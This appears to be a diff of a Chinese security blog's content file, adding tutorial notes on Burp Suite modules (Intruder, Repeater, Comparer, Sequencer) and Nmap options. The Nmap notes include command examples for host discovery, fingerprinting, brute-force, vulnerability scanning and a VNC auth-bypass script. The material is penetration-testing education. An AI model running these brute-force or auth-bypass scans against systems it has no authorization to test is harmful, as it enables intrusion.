+<h6 id="2-被动扫描-Passive-Scanning"><a href="#2-被动扫描-Passive-Scanning" class="headerlink" title="2.被动扫描(Passive Scanning)"></a>2.被动扫描(Passive Scanning)</h6><p>当使用被动扫描模式时，Burp不会重新发送新的请求，只是对已经存在的请求和应答进行分析，对服务端的检测来说，这比较安全，通常适用于生产环境的检测。一般来说，下列漏洞在被动模式中容易被检测出来。</p>
+<ul>
+<li>提交的密码为未加密的明文。</li>
+<li>不安全的cookie的属性，例如缺少HttpOnly和安全标志。</li>
+<li>cookie的范围缺失。</li>
+<li>跨域脚本包含和站点引用泄露。</li>
+<li>表单值自动填充，尤其是密码。</li>
+<li>SSL保护的内容缓存。</li>
+<li>目录列表。</li>
+<li>提交密码后应答延迟。</li>
+<li>session令牌的不安全传输。</li>
+<li>敏感信息泄露，例如内部IP地址、电子邮件地址、堆栈跟踪等信息泄露。</li>
+<li>不安全的ViewState的配置。</li>
+<li>错误或不规范的Content-Type指令。</li>
+</ul>
+<p>虽然被动扫描模式相比主动模式有很多不足，但同时也具有主动模式不具备的优点。除了对服务端的检测比较安全,当某种业务场景的测试每次都会破坏业务场景的某方面功能时，可以使用被动扫描模式验证是否存在漏洞，以减少测试的风险。</p>
+<h5 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h5><p>Intruder是一个定制的高度可配置的工具，可以对Web应用程序进行自动化攻击，如通过标识符枚举用户名、ID和账户号码，模糊测试，SQL注入，跨站，目录遍历<br>等。<br>它的工作原理是Intruder在原始请求数据的基础上，通过修改各种请求参数获取不同的请求应答。在每一次请求中，Intruder通常会携带一个或多个有效攻击载荷(Payload)，在不同的位置进行攻击重放，通过应答数据的比对分析获得需要的特征数据。Burp Intruder通常被应用于以下场景。</p>
+<ul>
+<li>标识符枚举。Web应用程序经常使用标识符引用用户、账户、资产等数据信息。例如，用户名、文件ID和账户号码。</li>
+<li>提取有用的数据。在某些场景下，不是简单地识别有效标识符，而是通过简单标识符提取其他数据。例如，通过用户的个人空间ID获取所有用户在其个人空间的名字和年龄。</li>
+<li>模糊测试。很多输入型的漏洞(如SQL注入、跨站点脚本和文件路径遍历)可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。受限于应用程序的大小和复杂性，手动执行这个测试是一个耗时且烦琐的过程，因此可以设置Payload,通过Burp Intruder自动化地对Web应用程序进行模糊测试</li>
+</ul>
+<p>Intruder攻击模式:</p>
+<ul>
+<li>Sniper模式使用单一的Payload组。它会针对每个位置设置Payload.这种攻击类型适用于对常见漏洞中的请求参数单独进行Fuzzing测试的情景。攻击中的请求总数应该是position数量和Payload数量的乘积。</li>
+<li>Battering ram模式使用单一的Payload组。它会重复Payload并一次性把所有相同的Payload放入指定的位置中。这种攻击适用于需要在请求中把相同的输入放到多个位置的情景。请求的总数是Payload组中Payload的总数。</li>
+<li>Pitchfork模式使用多个Payload组。攻击会同步迭代所有的Payload组，把Payload放入每个定义的位置中。这种攻击类型非常适合在不同位置中需要插入不同但相似输入的情况。请求的数量应该是最小的Payload组中的Payload数量。</li>
+<li>Cluster bomb模式会使用多个Payload组。每个定义的位置中有不同的Payload组。攻击会迭代每个Payload组，每种Payload组合都会被测试一遍。这种攻击适用于在位置中需要不同且不相关或者未知输入攻击的情景。攻击请求的总数是各Payload组中Payload数量的乘积。</li>
+</ul>
+<h5 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h5><p>Burp Repeater是一个手动修改、补发个别HTTP请求，并分析它们的响应的工具。它最大的用途就是能和其他Burp Suite工具结合起来使用。可以将目标站点地图、Burp Proxy浏览记录、Burp Intruder的攻击结果，发送到Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。</p>
+<p>Repeater分析选项有4种: Raw、Params、Headers和Hex。</p>
+<ul>
+<li>Raw:显示纯文本格式的消息。在文本面板的底部有一个搜索和加亮的功能，可以用来快速定位需要寻找的字符串，如出错消息。利用搜索栏左边的弹出项，能控制状况的灵敏度，以及是否使用简单文本或十六进制进行搜索。</li>
+<li>Params:对于包含参数(URL查询字符串、cookie头或者消息体)的请求，Params选项会把这些参数显示为名字/值的格式，这样就可以简单地对它们进行查看和修改了。</li>
+<li>Headers:将以名字/值的格式显示HTTP的消息头，并且以原始格式显示消息</li>
+<li>Hex:允许直接编辑由原始二进制数据组成的消息。</li>
+</ul>
+<p>在渗透测试过程中,我们经常使用Repeater进行请求与响应的消息验证分析，例如修改请求参数、验证输入的漏洞;修改请求参数、验证逻辑越权;从拦截历史记录中，捕获特征性的请求消息进行请求重放。</p>
+<h5 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h5><p>Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别，使用到的场合有:</p>
+<ul>
+<li>枚举用户名的过程中，对比分析登录成功和失败时，服务端反馈结果的区别。</li>
+<li>使用Intruder进行攻击时，对于不同的服务端响应，可以很快分析出两次响应的区别在哪里。</li>
+<li>进行SQL注入的盲注测试时，比较两次响应消息的差异，判断响应结果与注入条件的关联关系。</li>
+</ul>
+<p>使用Comparer时有两个步骤，先是数据加载，然后是差异分析。</p>
+<p>Comparer数据加载的常用方式如下所示。</p>
+<ul>
+<li>从其他Burp工具通过上下文菜单转发过来。</li>
+<li>直接粘贴。</li>
+<li>从文件里加载。</li>
+</ul>
+<p>加载完毕后，如果选择两次不同的请求或应答消息，则下发的比较按钮将被激活，此时可以选择文本比较或字节比较。</p>
+<h5 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h5><p>Burp Sequencer是一种用于分析数据样本随机性质量的工具。可以用它测试应用程序的会话令牌(Session token)、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。</p>
+<p>Burp Sequencer主要由信息截取(Live Capture)、手动加载 (Manual Load)和选项分析(Analysis Options)三个模块组成。</p>
+<p>在截取信息后，单击Load按钮加载信息，然后单击”Analyze now”按钮进行分析。</p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>Nmap (Network Mapper,网络映射器)是一款开放源代码的网络探测和安全审核工具。它被设计用来快速扫描大型网络，包括主机探测与发现、开放的端口情况、操作系统与应用服务指纹识别、WAF识别及常见安全漏洞。它的图形化界面是Zenmap，分布式框架为DNmap.</p>
+<p>Nmap的特点如下所示:</p>
+<ul>
+<li>主机探测:探测网络上的主机，如列出响应TCP和ICMP请求、ICMP请求、开放特别端口的主机。</li>
+<li>端口扫描:探测目标主机所开放的端口。</li>
+<li>版本检测:探测目标主机的网络服务，判断其服务名称及版本号。</li>
+<li>系统检测:探测目标主机的操作系统及网络设备的硬件特性。</li>
+<li>支持探测脚本的编写:使用Nmap的脚本引擎(NSE)和Lua编程语言。</li>
+</ul>
+<h4 id="Nmap入门"><a href="#Nmap入门" class="headerlink" title="Nmap入门"></a>Nmap入门</h4><h5 id="扫描参数"><a href="#扫描参数" class="headerlink" title="扫描参数"></a>扫描参数</h5><p>在命令行直接执行Nmap或查看帮助文档(输入nmap —help)将显示Nmap的用法及其功能。</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712072812958.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074450202.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074532948.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074558835.png" alt=""></p>
+<p>Nmap的相关参数的含义与用法:</p>
+<h6 id="1-设置扫描目标时用到的相关参数。"><a href="#1-设置扫描目标时用到的相关参数。" class="headerlink" title="1.设置扫描目标时用到的相关参数。"></a>1.设置扫描目标时用到的相关参数。</h6><ul>
+<li>-iL:从文件中导入目标主机或目标网段。</li>
+<li>-iR:随机选择目标主机。</li>
+<li>—exclude:后面跟的主机或网段将不在扫描范围内。</li>
+<li>—excludefile:导入文件中的主机或网段将不在扫描范围中。</li>
+</ul>
+<h6 id="2-与主机发现方法相关的参数。"><a href="#2-与主机发现方法相关的参数。" class="headerlink" title="2.与主机发现方法相关的参数。"></a>2.与主机发现方法相关的参数。</h6><ul>
+<li>-sL: List Scan(列表扫描)，仅列举指定目标的IP，不进行主机发现。</li>
+<li>-sn: Ping Scan,只进行主机发现，不进行端口扫描。</li>
+<li>-Pn:将所有指定的主机视作已开启，跳过主机发现的过程。</li>
+<li>-PS/PA/PU/PY [portlist]:使用TCP SYN/ACK或SCTP INIT/ECHO方式来发现。</li>
+<li>-PE/PP/PM:使用ICMP echo、timestamp、netmask请求包发现主机。</li>
+<li>-PO [protocol list]:使用IP协议包探测对方主机是否开启。</li>
+<li>-n/-R:-n表示不进行DNS解析;-R表示总是进行DNS解析。</li>
+<li>—dns-servers <serv1[,serv2],...>:指定DNS服务器。</li>
+<li>—system-dns:指定使用系统的DNS服务器。</li>
+<li>—traceroute:追踪每个路由节点。</li>
+</ul>
+<h6 id="3-与常见的端口扫描方法相关的参数。"><a href="#3-与常见的端口扫描方法相关的参数。" class="headerlink" title="3.与常见的端口扫描方法相关的参数。"></a>3.与常见的端口扫描方法相关的参数。</h6><ul>
+<li>-sS/sT/sA/sW/sM:指定使用TCP SYN/Connect()/ACK/Window/Maimon scans的方式对目标主机进行扫描。</li>
+<li>-sU:指定使用UDP扫描的方式确定目标主机的UDP端口状况。</li>
+<li>-sN/sF/sX:指定使用TCP Null/FIN/Xmas scans秘密扫描的方式协助探测对方的TCP端口状态。</li>
+<li>—scanflags \<flags\>:定制TCP包的flags。</li>
+<li>-sI <zombie host[:probeport]>:指定使用Idle scan的方式描目标主机(前提是需要找到合适的zombie host)。</li>
+<li>-sY/sZ:使用SCTP INIT/COOKIE-ECHO扫描SCTP协议端口的开放情况。</li>
+<li>-sO:使用IP protocol扫描确定目标机支持的协议类型。</li>
+<li>-b \<FTP relay host>:使用FTP bounce scan扫描方式。</li>
+</ul>
+<h6 id="4-跟端口参数与扫描顺序的设置相关的参数。"><a href="#4-跟端口参数与扫描顺序的设置相关的参数。" class="headerlink" title="4.跟端口参数与扫描顺序的设置相关的参数。"></a>4.跟端口参数与扫描顺序的设置相关的参数。</h6><ul>
+<li>-p \<port ranges>:扫描指定的端口。</li>
+<li>-F: Fast mode(快速模式)，仅扫描TOP 100的端口。</li>
+<li>-r:不进行端口随机打乱的操作(如无该参数，Nmap会将要扫描的端口以随机顺序的方式进行扫描，让Nmap的扫描不易被对方防火墙检测到)</li>
+<li>—top-ports \<number>:扫描开放概率最高的number个端口(Nmap的作者曾做过大规模的互联网扫描，以此统计网络上各种端口可能开放的概率，并排列出最有可能开放端口的列表，具体可以参见nmap-services文件。默认情况下，Nmap会扫描最有可能的1000个TCP端口)。</li>
+<li>—port-ratio \<ratio>:扫描指定频率以上的端口。与上述—top-ports类似，这里以概率作为参数，概率大于—port-ratio的端口才被扫描。显然参数必须在0~1之间，想了解具体的概率范围可以查看nmap-services文件。</li>
+</ul>
+<h6 id="5-与版本侦测相关的参数。"><a href="#5-与版本侦测相关的参数。" class="headerlink" title="5.与版本侦测相关的参数。"></a>5.与版本侦测相关的参数。</h6><ul>
+<li>-sV:指定让Nmap进行版本侦测。</li>
+<li>—version-intensity \<level>:指定版本侦测的强度(0~9)，默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</li>
+<li>—version-light:指定使用轻量级侦测方式(intensity 2)。</li>
+<li>—version-all:尝试使用所有的probes进行侦测(intensity 9)。</li>
+<li>—version-trace:显示出详细的版本侦测过程信息。</li>
+</ul>
+<p>在了解以上参数及其含义后，再来看用法会更好理解，扫描命令格式: </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap+扫描参数+目标地址或网段</span><br></pre></td></tr></table></figure>
+<p>例:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -v ip</span><br></pre></td></tr></table></figure>
+<p>其中-A表示使用进攻性(Aggressive)方式扫描; -T4表示指定扫描过程使用的时序(Timing)，共有6个级别(0~5)，级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通信状况良好的情况下推荐使用T4。-v表示显示冗余(verbosity)信息，在扫描过程中显示扫描的细节，有助于让用户了解当前的扫描状态。</p>
+<h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><h6 id="1-扫描单个目标地址"><a href="#1-扫描单个目标地址" class="headerlink" title="1.扫描单个目标地址"></a>1.扫描单个目标地址</h6><p>在Nmap后面直接添加目标地址即可扫描</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712080248534.png" alt=""></p>
+<h6 id="2-扫描多个目标地址"><a href="#2-扫描多个目标地址" class="headerlink" title="2.扫描多个目标地址"></a>2.扫描多个目标地址</h6><p>如果目标地址不在同一网段，或在同一网段但不连续且数量不多，可以使用该方法进行扫描。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1 192.168.56.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712080643727.png" alt=""></p>
+<h6 id="3-扫描一个范围内的目标地址"><a href="#3-扫描一个范围内的目标地址" class="headerlink" title="3.扫描一个范围内的目标地址"></a>3.扫描一个范围内的目标地址</h6><p>可以指定扫描一个连续的网段，中间使用”-“连接，例如，下列命令表示扫描范围为192.168.88.1~192.168.88.10。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1-10</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085718822.png" alt=""></p>
+<h6 id="4-扫描目标地址所在的某个网段"><a href="#4-扫描目标地址所在的某个网段" class="headerlink" title="4.扫描目标地址所在的某个网段"></a>4.扫描目标地址所在的某个网段</h6><p>以C段为例，如果目标是一个网段，则可以通过添加子网掩码的方式扫描，下列命令表示扫描范围为192.168.88.1~192.168.88.255。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1&#x2F;24</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085118209.png" alt=""></p>
+<h6 id="5-扫描主机列表target-txt中的所有目标地址"><a href="#5-扫描主机列表target-txt中的所有目标地址" class="headerlink" title="5.扫描主机列表target.txt中的所有目标地址"></a>5.扫描主机列表target.txt中的所有目标地址</h6><p>扫描target.txt中的地址或者网段，此处导入的是绝对路径，如果target.txt文件与nmap在同一个目录下，则直接引用文件名即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -iL target.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085423236.png" alt=""></p>
+<h6 id="6-扫描除某一个目标地址之外的所有目标地址"><a href="#6-扫描除某一个目标地址之外的所有目标地址" class="headerlink" title="6.扫描除某一个目标地址之外的所有目标地址"></a>6.扫描除某一个目标地址之外的所有目标地址</h6><p>下列命令表示扫描除192.168.0.105之外的其他192.168.0.x地址。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1&#x2F;24 --exclude 192.168.88.4</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085623439.png" alt=""></p>
+<h6 id="7-扫描除某一文件中的目标地址之外的目标地址"><a href="#7-扫描除某一文件中的目标地址之外的目标地址" class="headerlink" title="7.扫描除某一文件中的目标地址之外的目标地址"></a>7.扫描除某一文件中的目标地址之外的目标地址</h6><p>下列命令表示扫描除了target.txt文件中涉及的地址或网段之外的目标地址。还是以扫描192.168.88.x网段为例，在target.txt中添加192.168.88.1和192.168.88.5。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1&#x2F;24 --excludefile target.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085912318.png" alt=""></p>
+<h6 id="8-扫描某一目标地址的特定端口"><a href="#8-扫描某一目标地址的特定端口" class="headerlink" title="8.扫描某一目标地址的特定端口"></a>8.扫描某一目标地址的特定端口</h6><p>如果不需要对目标主机进行全端口扫描，只想探测它是否开放了某一端口，那么使用-p参数指定端口号，将大大提升扫描速度。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.1 -p 22,23,80</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712083949109.png" alt=""></p>
+<h6 id="9-对目标地址进行路由跟踪"><a href="#9-对目标地址进行路由跟踪" class="headerlink" title="9.对目标地址进行路由跟踪"></a>9.对目标地址进行路由跟踪</h6><p>下列命令表示对目标地址进行路由跟踪。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --traceroute 192.168.56.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712084213833.png" alt=""></p>
+<h6 id="10-扫描目标地址所在C段的在线状况"><a href="#10-扫描目标地址所在C段的在线状况" class="headerlink" title="10.扫描目标地址所在C段的在线状况"></a>10.扫描目标地址所在C段的在线状况</h6><p>下列命令表示扫描目标地址所在C段的在线状况。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712084355147.png" alt=""></p>
+<h6 id="11-目标地址的操作系统指纹识别"><a href="#11-目标地址的操作系统指纹识别" class="headerlink" title="11.目标地址的操作系统指纹识别"></a>11.目标地址的操作系统指纹识别</h6><p>下列命令表示通过指纹识别技术识别目标地址的操作系统的版本。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -O 192.168.88.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712090051908.png" alt=""></p>
+<h6 id="12-目标地址提供的服务版本检测"><a href="#12-目标地址提供的服务版本检测" class="headerlink" title="12.目标地址提供的服务版本检测"></a>12.目标地址提供的服务版本检测</h6><p>下列命令表示检测目标地址开放的端口对应的服务版本信息。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.88.1</span><br></pre></td></tr></table></figure>
+<h6 id="13-探测防火墙状态"><a href="#13-探测防火墙状态" class="headerlink" title="13.探测防火墙状态"></a>13.探测防火墙状态</h6><p>在实战中，可以利用FIN扫描的方式探测防火墙的状态。FIN扫描用于识别端口是否关闭，收到RST回复说明该端口关闭，否则就是open或filtered状态。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sF -T4 192.168.88.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712090442765.png" alt=""></p>
+<h5 id="状态识别"><a href="#状态识别" class="headerlink" title="状态识别"></a>状态识别</h5><p>Nmap输出的是扫描列表，包括端口号、端口状态、服务名称、服务版本及协议。通常有如下表所示的6种状态。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>状态</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>open</td>
+<td>开放的，表示应用程序正在监听该端口的连接，外部可以访问</td>
+</tr>
+<tr>
+<td>filtered</td>
+<td>被过滤的，表示端口被防火墙或其他网络设备阻止，不能访问</td>
+</tr>
+<tr>
+<td>closed</td>
+<td>关闭的，表示目标主机未开启该端口</td>
+</tr>
+<tr>
+<td>unfiltered</td>
+<td>未被过滤的，表示Nmap无法确定端口所处状态，需进一步探测</td>
+</tr>
+<tr>
+<td>open/filtered</td>
+<td>开放的或被过滤的，Nmap不能识别</td>
+</tr>
+<tr>
+<td>closed/filtered</td>
+<td>关闭的或被过滤的，Nmap不能识别</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>了解了以上状态，在渗透测试过程中，将有利于我们确定下一步应该采取什么<br>方法或攻击手段。</p>
+<h4 id="Nmap进阶"><a href="#Nmap进阶" class="headerlink" title="Nmap进阶"></a>Nmap进阶</h4><h5 id="脚本介绍"><a href="#脚本介绍" class="headerlink" title="脚本介绍"></a>脚本介绍</h5><p>Nmap的脚本默认存在/usr/share/nmap/scripts文件夹下</p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712095117059.png" alt=""></p>
+<p>Nmap的脚本主要分为以下几类:</p>
+<ul>
+<li>Auth:负责处理鉴权证书(绕过鉴权)的脚本。</li>
+<li>Broadcast:在局域网内探查更多服务的开启情况，如DHCP/DNS/SQLServer等。</li>
+<li>Brute:针对常见的应用提供暴力破解方式，如HTTP/SMTP等。</li>
+<li>Default:使用-sC或A选项扫描时默认的脚本，提供基本的脚本扫描能力。</li>
+<li>Discovery:对网络进行更多信息的搜集，如SMB枚举、SNMP查询等。</li>
+<li>Dos:用于进行拒绝服务攻击。</li>
+<li>Exploit: 利用已知的漏洞入侵系统。</li>
+<li>External:利用第三方的数据库或资源。例如，进行Whois解析。</li>
+<li>Fuzzer:模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞。</li>
+<li>Intrusive:入侵性的脚本，此类脚本可能弓发对方的IDS/IPS的记录或屏蔽。</li>
+<li>Malware:探测目标机是否感染了病毒、开启后门等信息。</li>
+<li>Safe:此类与Intrusive相反，属于安全性脚本。</li>
+<li>Version:负责增强服务与版本扫描功能的脚本。</li>
+<li>Vuln:负责检查目标机是否有常见漏洞，如MS08-067.</li>
+</ul>
+<h5 id="常见脚本"><a href="#常见脚本" class="headerlink" title="常见脚本"></a>常见脚本</h5><p>用户还可根据需要设置—script=类别进行扫描，常用参数如下所示:</p>
+<ul>
+<li>-sC/—script=default:使用默认的脚本进行扫描。</li>
+<li>—script= \<Lua scripts>:使用某个脚本进行扫描。</li>
+<li>—script-args=key1=value1,key2=value2…:该参数用于传递脚本里的参数，key1是参数名，该参数对应value1这个值。如有更多的参数，使用逗号连接。</li>
+<li>—script-args-file=filename:使用文件为脚本提供参数。</li>
+<li>—script-trace:如果设置该参数，则显示脚本执行过程中发送与接收的数据。</li>
+<li>—script-updatedb:在Nmap的scripts目录里有一个script.db文件，该文件保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启Nmap并调用了此参数，则Nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新。</li>
+<li>—script-help:调用该参数后，Nmap会输出该脚本对应的脚本使用参数，以及详细的介绍信息。</li>
+</ul>
+<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><h6 id="1-鉴权扫描"><a href="#1-鉴权扫描" class="headerlink" title="1.鉴权扫描"></a>1.鉴权扫描</h6><p>使用—script=auth可以对目标主机或目标主机所在的网段进行应用弱口令检测。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;auth 192.168.88.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712143952557.png" alt=""></p>
+<h6 id="2-暴力破解攻击"><a href="#2-暴力破解攻击" class="headerlink" title="2.暴力破解攻击"></a>2.暴力破解攻击</h6><p>Nmap具有暴力破解的功能，可对数据库、SMB、SNMP等进行简单密码的暴力猜解。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;brute 192.168.0.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144436805.png" alt=""></p>
+<h6 id="3-扫描常见的漏洞"><a href="#3-扫描常见的漏洞" class="headerlink" title="3.扫描常见的漏洞"></a>3.扫描常见的漏洞</h6><p>Nmap具备漏洞扫描的功能，可以检查目标主机或网段是否存在常见的漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;vuln 192.168.88.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144525432.png" alt=""></p>
+<h6 id="4-应用服务扫描"><a href="#4-应用服务扫描" class="headerlink" title="4.应用服务扫描"></a>4.应用服务扫描</h6><p>Nmap具备很多常见应用服务的扫描脚本，例如VNC服务、MySQL服务、Telnet服务、Rsync服务等,此处以VNC服务为例。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;realvnc-auth-bypass 192.168.88.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144648105.png" alt=""></p>
+<h6 id="5-探测局域网内更多服务开启的情况"><a href="#5-探测局域网内更多服务开启的情况" class="headerlink" title="5.探测局域网内更多服务开启的情况"></a>5.探测局域网内更多服务开启的情况</h6><p>输入以下命令即可探测局域网内更多服务开启的情况。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -n -p 445 --script&#x3D;broadcast 192.168.0.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144959242.png" alt=""></p>
+<h6 id="6-Whois解析"><a href="#6-Whois解析" class="headerlink" title="6.Whois解析"></a>6.Whois解析</h6><p>利用第三方的数据库或资源查询目标地址的信息，例如进行Whois解析。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -script external idefun.com</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712145517002.png" alt=""></p>
+<p>更多扫描脚本的使用方法可参见<a href="https://nmap.org/nsedoc/categories">https://nmap.org/nsedoc/categories</a>.</p>
+<h2 id="Web安全原理剖析"><a href="#Web安全原理剖析" class="headerlink" title="Web安全原理剖析"></a>Web安全原理剖析</h2><h3 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h3><h3 id="SQL注入进阶"><a href="#SQL注入进阶" class="headerlink" title="SQL注入进阶"></a>SQL注入进阶</h3><h3 id="SQL注入绕过技术"><a href="#SQL注入绕过技术" class="headerlink" title="SQL注入绕过技术"></a>SQL注入绕过技术</h3>]]></content>
       <categories>
         <category>Hack</category>
       </categories>
@@ -5114,7 +5610,33 @@
 <h2 id="5-Burpsuite-Target介绍"><a href="#5-Burpsuite-Target介绍" class="headerlink" title="5.Burpsuite Target介绍"></a>5.Burpsuite Target介绍</h2><p>Burp Target组件主要包含站点地图、目标域、Target 工具三部分组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息</p>
 <p>Target Scope中作用域的定义比较宽泛，通常来说，当我们对某个产品进行渗透测试时，可以通过域名或者主机名去限制拦截内容，这里域名或主机名就是我们说的作用域;如果我们想限制得更为细粒度化，比如，你只想拦截login目录下的所有请求，这时我们也可以在此设置，此时，作用域就是目录。</p>
 <h3 id="Target站点地图Sitemap介绍"><a href="#Target站点地图Sitemap介绍" class="headerlink" title="Target站点地图Sitemap介绍"></a>Target站点地图Sitemap介绍</h3><p>Site Map的左边为访问的URL,按照网站的层级和深度，树形展示整个应用系统的结构和关联其他域的url情况;右边显示的是某一个url被访问的明细列表，共访问哪些url,请求和应答内容分别是什么，都有着详实的记录。基于左边的树形结构，我们可以选择某个分支，对指定的路径进行扫描和抓取</p>
-<h2 id="6-Burpsuite-站点地图介绍"><a href="#6-Burpsuite-站点地图介绍" class="headerlink" title="6.Burpsuite 站点地图介绍"></a>6.Burpsuite 站点地图介绍</h2>]]></content>
+<h2 id="6-Burpsuite-站点地图介绍"><a href="#6-Burpsuite-站点地图介绍" class="headerlink" title="6.Burpsuite 站点地图介绍"></a>6.Burpsuite 站点地图介绍</h2><h3 id="目标分析"><a href="#目标分析" class="headerlink" title="目标分析"></a>目标分析</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061126089.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061243107.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061313124.png" alt=""></p>
+<h3 id="站点地图比较"><a href="#站点地图比较" class="headerlink" title="站点地图比较"></a>站点地图比较</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061805978.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061858034.png" alt=""></p>
+<h2 id="7-BurpSuite-爬虫介绍"><a href="#7-BurpSuite-爬虫介绍" class="headerlink" title="7.BurpSuite 爬虫介绍"></a>7.BurpSuite 爬虫介绍</h2><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708072254485.png" alt="image-20210708072254485"></p>
+<h3 id="BurpSuite-spider-control介绍"><a href="#BurpSuite-spider-control介绍" class="headerlink" title="BurpSuite spider control介绍"></a>BurpSuite spider control介绍</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708072433387.png" alt="image-20210708072433387"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708074243626.png" alt="image-20210708074243626"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708074425977.png" alt="image-20210708074425977"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708074440370.png" alt="image-20210708074440370"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708074847766.png" alt="image-20210708074847766"></p>
